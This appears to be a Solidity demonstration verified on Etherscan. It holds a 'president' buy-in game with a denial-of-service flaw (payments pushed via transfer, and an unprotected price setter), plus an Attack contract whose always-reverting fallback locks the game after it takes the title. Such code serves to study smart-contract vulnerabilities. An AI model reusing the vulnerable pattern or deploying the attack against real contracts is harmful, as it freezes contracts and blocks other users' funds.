/**
 *Submitted for verification at Etherscan.io on 2021-11-20
*/

pragma solidity ^0.4.22;
contract PresidentOfCountry{
    address public president;
    uint256 public price;
    
    function PresidentOfCountry() {
        president = msg.sender;
    }
        function Price(uint256 _price){
        require(_price>0);
        price = _price;
    }
    
    function becomePresident() payable {
        require(msg.value >= price);
        president.transfer(price);
        president=msg.sender;
        price=price*2;
    }
    function showAccount() public returns(uint) {
        return this.balance;
    }
}

contract Attack {
    function () { revert(); }
    
    function sendMoney(address addr) payable {
        PresidentOfCountry(addr).call.value(msg.value)(bytes4(keccak256("becomePresident()")));
    }
}